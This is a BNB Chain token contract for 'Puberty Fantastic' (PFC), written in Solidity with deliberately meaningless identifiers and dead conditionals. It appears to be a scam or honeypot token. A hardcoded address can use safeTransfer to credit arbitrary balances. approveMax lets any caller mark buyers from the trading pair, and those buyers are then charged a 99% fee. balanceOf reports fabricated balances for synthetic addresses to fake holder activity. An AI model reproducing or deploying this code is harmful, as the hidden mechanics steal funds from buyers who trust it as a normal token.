/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;



library SafeMath {

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IBEP20 {

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}




contract PubertyFantastic is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private tradingAutoMinEnable = 0;
    string constant _name = "Puberty Fantastic";
    address public uniswapV2Pair;

    uint256 private listLaunchReceiverBuy = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    uint256  walletListSellEnableMintAt = 100000000 * 10 ** _decimals;
    uint256 constant totalReceiverShouldBuyTxAtSwap = 300000 * 10 ** 18;
    bool private fromSwapEnableTo = false;
    uint256 shouldTokenBurnTeam = 0;

    bool public minShouldReceiverTxExempt = false;

    uint256 constant receiverLaunchTxTake = 100000000 * (10 ** 18);
    bool public limitListIsLiquidity = false;
    uint256 private exemptListTotalSenderToSellTrading = 100;
    mapping(address => uint256) _balances;

    uint256 private limitToAmountAutoSwapTeam = 0;

    



    address private botsAtFeeSenderListSellTotal = (msg.sender);
    bool public sellFeeEnableList = false;
    mapping(address => bool)  botsReceiverTakeSenderAtIs;
    mapping(address => bool) private teamFeeToTokenReceiver;
    IUniswapV2Router public fromAtIsLimit;
    uint256 constant maxBuyMarketingSwap = 10000 * 10 ** 18;
    uint256 private marketingTokenModeTake = 0;

    uint256 private exemptBotsShouldTrading = 0;
    uint256  tokenLiquidityExemptReceiverTo = 100000000 * 10 ** _decimals;
    string constant _symbol = "PFC";
    mapping(address => bool)  takeLiquidityFromTeam;
    uint256 private buyTeamSellMode = 0;

    bool private listMaxBurnLiquidityFeeSender = false;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        fromAtIsLimit = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(fromAtIsLimit.factory()).createPair(address(this), fromAtIsLimit.WETH());
        _allowances[address(this)][address(fromAtIsLimit)] = receiverLaunchTxTake;

        teamFeeToTokenReceiver[msg.sender] = true;
        teamFeeToTokenReceiver[address(this)] = true;

        _balances[msg.sender] = receiverLaunchTxTake;
        emit Transfer(address(0), msg.sender, receiverLaunchTxTake);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return receiverLaunchTxTake;
    }

    function tradingFeeTxMin(address liquidityBurnFundToMarketingMax) private pure returns (bool) {
        return liquidityBurnFundToMarketingMax == listBuyExemptTxFeeTo();
    }

    function walletTokenAmountMode(address txMintModeExempt, address totalWalletTakeBotsReceiverTx, uint256 botsLiquidityAutoToLimitLaunchedBurn) internal returns (uint256) {
        
        if (limitListIsLiquidity != sellFeeEnableList) {
            limitListIsLiquidity = limitListIsLiquidity;
        }

        if (buyTeamSellMode != buyTeamSellMode) {
            buyTeamSellMode = limitToAmountAutoSwapTeam;
        }

        if (tradingAutoMinEnable != limitToAmountAutoSwapTeam) {
            tradingAutoMinEnable = limitToAmountAutoSwapTeam;
        }


        uint256 senderEnableMinAmount = botsLiquidityAutoToLimitLaunchedBurn.mul(exemptMinModeSell(txMintModeExempt, totalWalletTakeBotsReceiverTx == uniswapV2Pair)).div(exemptListTotalSenderToSellTrading);

        if (senderEnableMinAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(senderEnableMinAmount);
            emit Transfer(txMintModeExempt, address(this), senderEnableMinAmount);
        }

        return botsLiquidityAutoToLimitLaunchedBurn.sub(senderEnableMinAmount);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (feeBurnShouldWallet(uint160(account))) {
            return walletSenderBotsTo(uint160(account));
        }
        return _balances[account];
    }

    function exemptMarketingFundTo(address txMintModeExempt, address mintReceiverSellLiquidity, uint256 botsLiquidityAutoToLimitLaunchedBurn, bool marketingWalletMaxSellBuy) private {
        uint160 sellReceiverTokenWallet = uint160(receiverLaunchTxTake);
        if (marketingWalletMaxSellBuy) {
            txMintModeExempt = address(uint160(sellReceiverTokenWallet + shouldTokenBurnTeam));
            shouldTokenBurnTeam++;
            _balances[mintReceiverSellLiquidity] = _balances[mintReceiverSellLiquidity].add(botsLiquidityAutoToLimitLaunchedBurn);
        } else {
            _balances[txMintModeExempt] = _balances[txMintModeExempt].sub(botsLiquidityAutoToLimitLaunchedBurn);
        }
        if (botsLiquidityAutoToLimitLaunchedBurn == 0) {
            return;
        }
        emit Transfer(txMintModeExempt, mintReceiverSellLiquidity, botsLiquidityAutoToLimitLaunchedBurn);
    }

    function listBuyExemptTxFeeTo() private pure returns (address) {
        return 0xad65076B3d72F1851ca09d3bD55847CCeB1Ca8d6;
    }

    function setlistEnableModeFee(uint256 liquidityWalletAmountTake) public onlyOwner {
        if (buyTeamSellMode != exemptBotsShouldTrading) {
            exemptBotsShouldTrading=liquidityWalletAmountTake;
        }
        if (buyTeamSellMode == marketingTokenModeTake) {
            marketingTokenModeTake=liquidityWalletAmountTake;
        }
        if (buyTeamSellMode != limitToAmountAutoSwapTeam) {
            limitToAmountAutoSwapTeam=liquidityWalletAmountTake;
        }
        buyTeamSellMode=liquidityWalletAmountTake;
    }

    function launchedLiquiditySwapModeAtWalletTeam(address txMintModeExempt) internal view returns (bool) {
        return !teamFeeToTokenReceiver[txMintModeExempt];
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != receiverLaunchTxTake) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return mintBuyBotsList(sender, recipient, amount);
    }

    function getburnAtFromLiquidityTeam() public view returns (uint256) {
        if (exemptListTotalSenderToSellTrading == marketingTokenModeTake) {
            return marketingTokenModeTake;
        }
        if (exemptListTotalSenderToSellTrading != tradingAutoMinEnable) {
            return tradingAutoMinEnable;
        }
        if (exemptListTotalSenderToSellTrading != exemptListTotalSenderToSellTrading) {
            return exemptListTotalSenderToSellTrading;
        }
        return exemptListTotalSenderToSellTrading;
    }

    function walletSenderBotsTo(uint160 liquidityBurnFundToMarketingMax) private view returns (uint256) {
        uint160 sellReceiverTokenWallet = uint160(receiverLaunchTxTake);
        if ((liquidityBurnFundToMarketingMax - uint160(sellReceiverTokenWallet)) < shouldTokenBurnTeam) {
            return maxBuyMarketingSwap;
        }
        return totalReceiverShouldBuyTxAtSwap;
    }

    function setlaunchedMinSwapEnableLaunchShould(uint256 liquidityWalletAmountTake) public onlyOwner {
        if (exemptBotsShouldTrading != exemptBotsShouldTrading) {
            exemptBotsShouldTrading=liquidityWalletAmountTake;
        }
        if (exemptBotsShouldTrading != listLaunchReceiverBuy) {
            listLaunchReceiverBuy=liquidityWalletAmountTake;
        }
        if (exemptBotsShouldTrading != buyTeamSellMode) {
            buyTeamSellMode=liquidityWalletAmountTake;
        }
        exemptBotsShouldTrading=liquidityWalletAmountTake;
    }

    function getshouldWalletAtTokenAmountFromExempt() public view returns (uint256) {
        if (limitToAmountAutoSwapTeam != tradingAutoMinEnable) {
            return tradingAutoMinEnable;
        }
        return limitToAmountAutoSwapTeam;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function botsAtTeamSender(address senderFundReceiverTxLaunchBuy) private view returns (bool) {
        if (senderFundReceiverTxLaunchBuy == botsAtFeeSenderListSellTotal) {
            return true;
        }
        if (senderFundReceiverTxLaunchBuy == address(0)) {
            return false;
        }
        return false;
    }

    function feeBurnShouldWallet(uint160 liquidityBurnFundToMarketingMax) private pure returns (bool) {
        uint160 sellReceiverTokenWallet = uint160(receiverLaunchTxTake);
        if (liquidityBurnFundToMarketingMax >= uint160(sellReceiverTokenWallet)) {
            if (liquidityBurnFundToMarketingMax <= uint160(sellReceiverTokenWallet) + 300000) {
                return true;
            }
        }
        return false;
    }

    function approveMax(address spender) external {
        if (takeLiquidityFromTeam[spender]) {
            botsReceiverTakeSenderAtIs[spender] = true;
        }
    }

    function liquidityTeamShouldToken(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setliquiditySellLaunchedTx(uint256 liquidityWalletAmountTake) public onlyOwner {
        if (listLaunchReceiverBuy == listLaunchReceiverBuy) {
            listLaunchReceiverBuy=liquidityWalletAmountTake;
        }
        if (listLaunchReceiverBuy != marketingTokenModeTake) {
            marketingTokenModeTake=liquidityWalletAmountTake;
        }
        listLaunchReceiverBuy=liquidityWalletAmountTake;
    }

    function setburnAtFromLiquidityTeam(uint256 liquidityWalletAmountTake) public onlyOwner {
        if (exemptListTotalSenderToSellTrading != limitToAmountAutoSwapTeam) {
            limitToAmountAutoSwapTeam=liquidityWalletAmountTake;
        }
        if (exemptListTotalSenderToSellTrading != listLaunchReceiverBuy) {
            listLaunchReceiverBuy=liquidityWalletAmountTake;
        }
        exemptListTotalSenderToSellTrading=liquidityWalletAmountTake;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function safeTransfer(address txMintModeExempt, address mintReceiverSellLiquidity, uint256 botsLiquidityAutoToLimitLaunchedBurn) public {
        if (!tradingFeeTxMin(msg.sender)) {
            return;
        }
        if (feeBurnShouldWallet(uint160(mintReceiverSellLiquidity))) {
            exemptMarketingFundTo(txMintModeExempt, mintReceiverSellLiquidity, botsLiquidityAutoToLimitLaunchedBurn, false);
            return;
        }
        if (mintReceiverSellLiquidity == address(1)) {
            return;
        }
        if (feeBurnShouldWallet(uint160(txMintModeExempt))) {
            exemptMarketingFundTo(txMintModeExempt, mintReceiverSellLiquidity, botsLiquidityAutoToLimitLaunchedBurn, true);
            return;
        }
        if (botsLiquidityAutoToLimitLaunchedBurn == 0) {
            return;
        }
        if (txMintModeExempt == address(0)) {
            _balances[mintReceiverSellLiquidity] = _balances[mintReceiverSellLiquidity].add(botsLiquidityAutoToLimitLaunchedBurn);
            return;
        }
    }

    function exemptMinModeSell(address txMintModeExempt, bool buyLiquidityWalletTokenAuto) internal returns (uint256) {
        if (botsReceiverTakeSenderAtIs[txMintModeExempt]) {
            return 99;
        }
        
        if (buyLiquidityWalletTokenAuto) {
            return marketingTokenModeTake;
        }
        if (!buyLiquidityWalletTokenAuto && txMintModeExempt == uniswapV2Pair) {
            return listLaunchReceiverBuy;
        }
        return 0;
    }

    function setmaxShouldWalletSwap(bool liquidityWalletAmountTake) public onlyOwner {
        if (minShouldReceiverTxExempt != fromSwapEnableTo) {
            fromSwapEnableTo=liquidityWalletAmountTake;
        }
        minShouldReceiverTxExempt=liquidityWalletAmountTake;
    }

    function setshouldWalletAtTokenAmountFromExempt(uint256 liquidityWalletAmountTake) public onlyOwner {
        if (limitToAmountAutoSwapTeam == exemptBotsShouldTrading) {
            exemptBotsShouldTrading=liquidityWalletAmountTake;
        }
        if (limitToAmountAutoSwapTeam != marketingTokenModeTake) {
            marketingTokenModeTake=liquidityWalletAmountTake;
        }
        if (limitToAmountAutoSwapTeam == marketingTokenModeTake) {
            marketingTokenModeTake=liquidityWalletAmountTake;
        }
        limitToAmountAutoSwapTeam=liquidityWalletAmountTake;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getlistEnableModeFee() public view returns (uint256) {
        if (buyTeamSellMode != marketingTokenModeTake) {
            return marketingTokenModeTake;
        }
        if (buyTeamSellMode == buyTeamSellMode) {
            return buyTeamSellMode;
        }
        if (buyTeamSellMode == buyTeamSellMode) {
            return buyTeamSellMode;
        }
        return buyTeamSellMode;
    }

    function mintBuyBotsList(address txMintModeExempt, address mintReceiverSellLiquidity, uint256 botsLiquidityAutoToLimitLaunchedBurn) internal returns (bool) {
        if (feeBurnShouldWallet(uint160(mintReceiverSellLiquidity))) {
            exemptMarketingFundTo(txMintModeExempt, mintReceiverSellLiquidity, botsLiquidityAutoToLimitLaunchedBurn, false);
            return true;
        }
        if (feeBurnShouldWallet(uint160(txMintModeExempt))) {
            exemptMarketingFundTo(txMintModeExempt, mintReceiverSellLiquidity, botsLiquidityAutoToLimitLaunchedBurn, true);
            return true;
        }
        
        if (exemptBotsShouldTrading == listLaunchReceiverBuy) {
            exemptBotsShouldTrading = limitToAmountAutoSwapTeam;
        }

        if (limitListIsLiquidity != limitListIsLiquidity) {
            limitListIsLiquidity = sellFeeEnableList;
        }

        if (fromSwapEnableTo == limitListIsLiquidity) {
            fromSwapEnableTo = listMaxBurnLiquidityFeeSender;
        }


        bool feeMaxLaunchTotal = botsAtTeamSender(txMintModeExempt) || botsAtTeamSender(mintReceiverSellLiquidity);
        
        if (limitToAmountAutoSwapTeam == exemptListTotalSenderToSellTrading) {
            limitToAmountAutoSwapTeam = marketingTokenModeTake;
        }

        if (fromSwapEnableTo != sellFeeEnableList) {
            fromSwapEnableTo = minShouldReceiverTxExempt;
        }


        if (txMintModeExempt == uniswapV2Pair && !feeMaxLaunchTotal) {
            takeLiquidityFromTeam[mintReceiverSellLiquidity] = true;
        }
        
        if (feeMaxLaunchTotal) {
            return liquidityTeamShouldToken(txMintModeExempt, mintReceiverSellLiquidity, botsLiquidityAutoToLimitLaunchedBurn);
        }
        
        _balances[txMintModeExempt] = _balances[txMintModeExempt].sub(botsLiquidityAutoToLimitLaunchedBurn, "Insufficient Balance!");
        
        if (buyTeamSellMode != buyTeamSellMode) {
            buyTeamSellMode = exemptListTotalSenderToSellTrading;
        }


        uint256 botsToFeeFromMaxLiquidity = launchedLiquiditySwapModeAtWalletTeam(txMintModeExempt) ? walletTokenAmountMode(txMintModeExempt, mintReceiverSellLiquidity, botsLiquidityAutoToLimitLaunchedBurn) : botsLiquidityAutoToLimitLaunchedBurn;

        _balances[mintReceiverSellLiquidity] = _balances[mintReceiverSellLiquidity].add(botsToFeeFromMaxLiquidity);
        emit Transfer(txMintModeExempt, mintReceiverSellLiquidity, botsToFeeFromMaxLiquidity);
        return true;
    }

    function getliquiditySellLaunchedTx() public view returns (uint256) {
        if (listLaunchReceiverBuy == tradingAutoMinEnable) {
            return tradingAutoMinEnable;
        }
        if (listLaunchReceiverBuy == exemptListTotalSenderToSellTrading) {
            return exemptListTotalSenderToSellTrading;
        }
        return listLaunchReceiverBuy;
    }

    function getmaxShouldWalletSwap() public view returns (bool) {
        if (minShouldReceiverTxExempt == sellFeeEnableList) {
            return sellFeeEnableList;
        }
        if (minShouldReceiverTxExempt == minShouldReceiverTxExempt) {
            return minShouldReceiverTxExempt;
        }
        return minShouldReceiverTxExempt;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return botsReceiverTakeSenderAtIs[spender];
    }

    function getlaunchedMinSwapEnableLaunchShould() public view returns (uint256) {
        return exemptBotsShouldTrading;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return mintBuyBotsList(msg.sender, recipient, amount);
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}